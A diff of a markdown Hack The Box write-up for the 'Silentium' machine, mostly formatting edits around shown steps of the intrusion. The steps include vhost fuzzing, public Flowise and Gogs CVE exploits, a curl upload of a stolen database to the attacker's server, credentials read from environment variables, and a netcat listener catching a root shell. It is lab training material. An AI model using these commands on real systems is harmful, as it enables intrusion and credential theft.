@@ -1,15 +1,13 @@
 ---
-title: Silentium [HTB] 
+title: Silentium [HTB]
 updated: 2026-09-13
 published: 2026-09-13
-description: "Silentium is an easy rated Linux box...."
+description: Silentium is an easy rated Linux box....
 tags:
   - Silentium
-  - HTB
-  - Writeup
 draft: false
-category: "HTB"
-image: "./silentium.png"
+category: HTB
+image: ./silentium.png
 aliases:
 ---
 
@@ -99,7 +97,7 @@ with nothing interesting  other than few usernames (find them out).
 
 I was eager to see the directories server exposed. I could have simply tried with `gobuster` or `ffuf` but `feroxbuster` is more robust , which resulted `found:0`
 
-```zsh
+```zsh wrap=false
 0xz1nn ✦ Documents/HTB/silentium
 ❯ feroxbuster -u http://$target                                         
  ___  ___  __   __     __      __         __   ___
@@ -126,6 +124,9 @@ by Ben "epi" Risher 🤓                 ver: 2.13.1
 [####################] - 2m     30000/30000   211/s   http://10.129.95.152/
 ```
 
+>[!tip]Correction
+>The reason the scan returned me `found:0` because, I had passed the target Ip address here rather than the domain name of the target although the scan didn't lead me to a rabbit hole.
+
 What could be other potential vector to look at, at this point other subdomains? (I already did full port scan, no new ports were discovered!)
 
 **⮇**
@@ -134,7 +135,7 @@ What could be other potential vector to look at, at this point other subdomains?
 
 I used `ffuf` to fuzz the `Host` header  (`-H "Host: FUZZ.silentium.htb"`) which successfully discovered hidden Virtual Host `staging`.
 
-```zsh
+```zsh wrap=false
 0xz1nn ✦ Documents/HTB/silentium
 ❯ ffuf -u http://$target -H "Host: FUZZ.silentium.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -mc all -ac -fc 302
 
@@ -220,7 +221,7 @@ Logged on to the site, which is hosting **Flowise** version  `3.0.5` which has *
 
 Cloned the repository of the exploit then, used UV to gracefully add the requirements and run.
 
-```zsh
+```zsh wrap=false
 0xz1nn ✦ ~/Documents/HTB/silentium/CVE-2025-58434-AND-59528-POC      
 ❯ uv init                                                                   
 Initialized project `cve-2025-58434-and-59528-poc`  
@@ -302,7 +303,6 @@ Ran the script with  `rce` module (You could also use the `chain` module to full
 ### Enumeration
 
 ```zsh
-
 /home # cd /root
 ~ # ls
 ~ # ls -la
@@ -325,7 +325,7 @@ but the hashcat couldn't help cracking it.
 
 hosted an upload server
 
-```zsh
+```zsh wrap=false
 0xz1nn ✦ ~/Documents/HTB/silentium/CVE-2025-58434-AND-59528-POC
 ❯ uvx uploadserver 80  
 File upload available at /upload
@@ -338,7 +338,7 @@ Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
 
 and uploaded files!
 
-```zsh
+```zsh wrap=false
 ~/.flowise # curl -X POST -F 'files=@database.sqlite' http://10.10.14.201/upload
   % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                  Dload  Upload   Total   Spent    Left  Speed
@@ -352,7 +352,7 @@ and uploaded files!
 
 ### Enumerating `database.sqlite`
 
-```zsh
+```zsh wrap=false
 0xz1nn ✦ ~/Documents/HTB/silentium/CVE-2025-58434-AND-59528-POC            
 ❯ sqlite3 database.sqlite                                                           
 SQLite version 3.46.1 2024-08-13 09:16:08
@@ -368,7 +368,7 @@ e26c9d6c-678c-4c10-9e36-01813e8fea73|admin|ben@silentium.htb|$2a$05$wB8f72fwPHx2
 
 When a process is running inside a container, the developer may set the interesting environment variables to allow the application to connect with other applications as admin/root.
 
-```zsh
+```zsh wrap=false
 / # printenv
 FLOWISE_PASSWORD=F1l3_d0ck3r
 ALLOW_UNAUTHORIZED_CERTS=true
@@ -415,7 +415,7 @@ SMTP_PASSWORD=r04D!!_R4ge
 
 Having legit creds from the environment variables  tried to establish an SSH connection as ben.
 
-```zsh
+```zsh wrap=false
 0xz1nn ✦ ~/Documents/HTB/silentium/CVE-2025-58434-AND-59528-POC           
 ❯ ssh ben@silentium.htb                                                                                 
 The authenticity of host 'silentium.htb (10.129.95.152)' can't be established.                                      
@@ -439,7 +439,7 @@ ben@silentium:~$
 
 While enumerating the target `/opt` I found **Gogs** Which is  a self hosted Git service, which means the Gogs is most likely running locally on the machine.
 
-```zsh
+```zsh wrap=false
 ben@silentium:/opt/gogs/gogs$ ls -la
 total 79368
 drwxr-xr-x 6 root root     4096 Apr  8 09:41 .
@@ -464,7 +464,7 @@ where port 1025 and 8025 are related to mail services.
 
 I port fowarded through ssh (to attacker) to access the port 3001 which is running locally on the target machine, so that I can access the port 3001 from my machine directly.
 
-``` zsh
+``` zsh wrap=false
 0xz1nn ✦ ~/Documents/HTB/silentium                                   
 ❯ ssh -L 3001:127.0.0.1:3001 ben@silentium
 ben@silentium's password:    
@@ -480,7 +480,7 @@ ben@silentium's password:
 
 Then I searched for the public exploits for the Gogs which led me to `CVE-2025-8110` which can give `RCE` on the target. And also searching for exploits I found this [repo](https://github.com/hassan-hamadi/CVE-2025-8110-Silentium-HTB) which could fully automate the exploit. I cloned the repo and added the requirements.txt with `uv`
 
-```zsh
+```zsh wrap=false
 0xz1nn ✦ ~/Documents/HTB/silentium/CVE-2025-8110-Silentium-HTB      
 ❯ uv init
 Initialized project `cve-2025-8110-silentium-htb`
@@ -523,7 +523,7 @@ Token generation status: 200
 
 my listener caught the connection.
 
-```zsh
+```zsh wrap=false
 0xz1nn ✦ ~/Documents/HTB/silentium
 ❯ rlwrap nc -lnvp 443         
 listening on [any] 443 ...
@@ -553,10 +553,6 @@ The vulnerabillity gave `RCE` as the root because the Gogs is running as root on
 ben@silentium:/opt/gogs/gogs$ ps aux | grep root
 
 root        1481  0.1  3.3 2716984 133560 ?      Ssl  07:23   0:55 /opt/gogs/gogs/gogs web
-```
-
-```
-https://labs.hackthebox.com/achievement/machine/2244380/867
 ```
 
 ![Silentium Pwned...](silentium-pwned.png)
